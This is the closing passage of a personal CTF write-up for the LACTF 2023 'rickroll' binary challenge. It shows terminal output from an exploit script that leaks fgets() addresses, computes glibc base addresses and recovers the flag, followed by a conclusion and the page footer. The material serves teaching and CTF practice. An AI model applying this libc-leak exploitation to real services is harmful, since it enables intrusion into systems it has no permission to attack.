+</code></pre></div><p>When executed:</p>
+<pre tabindex=0><code>$ python3 solve.py lac.tf 31135   
+
+[*] '/home/anger/hack/ctf/LACTF2023/rickroll/rickroll_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x3ff000) RUNPATH: b'.'   
+[+] Opening connection to lac.tf on port 31135: Done   
+[*] Leaked fgets() address: 0x7fa4f94079c0   
+[+] Glibc base address: 0x7fa4f9396000   
+[*] Closed connection to lac.tf port 31135   
+[+] Opening connection to lac.tf on port 31135: Done   
+[*] Leaked fgets() address: 0x7f1ece3cf9c0   
+[+] Glibc base address: 0x7f1ece35e000   
+[*] Closed connection to lac.tf port 31135   
+[+] Opening connection to lac.tf on port 31135: Done   
+[*] Leaked fgets() address: 0x7f81dba5f9c0   
+[+] Glibc base address: 0x7f81db9ee000   
+[*] Closed connection to lac.tf port 31135   
+[+] Opening connection to lac.tf on port 31135: Done   
+[*] Leaked fgets() address: 0x7f3bdb53c9c0 [+] Glibc base address: 0x7f3bdb4cb000   
+[*] Closed connection to lac.tf port 31135   
+[+] Opening connection to lac.tf on port 31135: Done   
+[*] Leaked fgets() address: 0x7f0c5b7639c0   
+[+] Glibc base address: 0x7f0c5b6f2000   
+[*] Closed connection to lac.tf port 31135 [+] Opening connection to lac.tf on port 31135: Done   
+[*] Leaked fgets() address: 0x7effec44b9c0   
+[+] Glibc base address: 0x7effec3da000   
+[*] Closed connection to lac.tf port 31135   
+[+] Opening connection to lac.tf on port 31135: Done   
+[*] Leaked fgets() address: 0x7f438f0d29c0   
+[+] Glibc base address: 0x7f438f061000   
+[*] Closed connection to lac.tf port 31135   
+[+] Opening connection to lac.tf on port 31135: Done   
+[*] Leaked fgets() address: 0x7fd7ca6789c0   
+[+] Glibc base address: 0x7fd7ca607000   
+[+] lactf{printf_gave_me_up_and_let_me_down}   
+[*] Closed connection to lac.tf port 31135  
+</code></pre><h2 id=conclusion>Conclusion<a hidden class=anchor aria-hidden=true href=#conclusion>#</a></h2>
+<p>It was a fun CTF and I look forward to next years event. I would like to thank my new teammates at /bin/cat, we only had three people working on this event but still placed very high.</p>
+<h3 id=note>Note:<a hidden class=anchor aria-hidden=true href=#note>#</a></h3>
+<p>I would like to apologize for any inconsistent formatting. I&rsquo;m still working on a better way to convert the markdown I make these posts in to the HTML/JS I use on this site. This is also my first personal write-up so I am working on making them better and more detailed.</p>
+</div>
+<footer class=post-footer>
+<ul class=post-tags>
+<li><a href=https://jaxd.dev/tags/ctf/>ctf</a></li>
+<li><a href=https://jaxd.dev/tags/lactf/>LACTF</a></li>
+<li><a href=https://jaxd.dev/tags/write-up/>write-up</a></li>
+<li><a href=https://jaxd.dev/tags/2023/>2023</a></li>
+</ul>
+<nav class=paginav>
+<a class=prev href=https://jaxd.dev/post/hxp2023/>
+<span class=title>« Prev</span>
+<br>
+<span>hxp 2023 Valentine Write-Up</span>
+</a>
+<a class=next href=https://jaxd.dev/post/c-plus-plus-is-odd/>
+<span class=title>Next »</span>
+<br>
+<span>C++ is Odd</span>
+</a>
+</nav>
+<div class=share-buttons>
+<a target=_blank rel="noopener noreferrer" aria-label="share LACTF 2023 Write-Ups on twitter" href="https://twitter.com/intent/tweet/?text=LACTF%202023%20Write-Ups&url=https%3a%2f%2fjaxd.dev%2fpost%2flactf2023%2f&hashtags=ctf%2cLACTF%2cwrite-up%2c2023"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share LACTF 2023 Write-Ups on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fjaxd.dev%2fpost%2flactf2023%2f&title=LACTF%202023%20Write-Ups&summary=LACTF%202023%20Write-Ups&source=https%3a%2f%2fjaxd.dev%2fpost%2flactf2023%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share LACTF 2023 Write-Ups on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fjaxd.dev%2fpost%2flactf2023%2f&title=LACTF%202023%20Write-Ups"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share LACTF 2023 Write-Ups on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fjaxd.dev%2fpost%2flactf2023%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share LACTF 2023 Write-Ups on whatsapp" href="https://api.whatsapp.com/send?text=LACTF%202023%20Write-Ups%20-%20https%3a%2f%2fjaxd.dev%2fpost%2flactf2023%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share LACTF 2023 Write-Ups on telegram" href="https://telegram.me/share/url?text=LACTF%202023%20Write-Ups&url=https%3a%2f%2fjaxd.dev%2fpost%2flactf2023%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
+</a>
+</div>
+</footer>
+</article>
+</main>
+<footer class=footer>
+<span>&copy; 2023 <a href=https://jaxd.dev>Jax | Anger</a></span>
+<span>
+Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a>
+</span>
+</footer>
+<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a>
+<script>let menu=document.getElementById('menu');menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
+<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
+<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
+<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerHTML='copy';function d(){a.innerHTML='copied!',setTimeout(()=>{a.innerHTML='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
+</body>
+</html>
